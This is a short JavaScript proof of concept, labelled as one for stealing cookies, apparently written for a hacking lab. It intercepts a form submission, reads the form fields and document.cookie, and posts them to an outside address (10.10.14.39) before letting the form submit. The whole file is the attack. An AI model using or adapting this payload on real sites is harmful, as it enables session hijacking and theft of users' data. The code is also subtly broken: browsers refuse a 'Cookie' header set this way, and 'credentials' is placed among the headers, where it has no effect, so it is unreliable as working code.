// poc to steal cookies
const form = document.querySelector('form');

form.addEventListener('submit', function(event) {

  event.preventDefault();


  const reportTitle = document.getElementById('report_title').value;
  const description = document.getElementById('description').value;


  const cookies = document.cookie;


  fetch('http://10.10.14.39/', {
    method: 'POST',
    body: JSON.stringify({ reportTitle, description }),
    headers: {
      'Content-Type': 'application/json',
      'Cookie': cookies, 
      'credentials': 'include'
    }
  })
  .then(response => response.json())
  .then(data => {
    console.log('Response from server:', data);
  })
  .catch(error => {
    console.error('Error:', error);
  });


  this.submit();
});
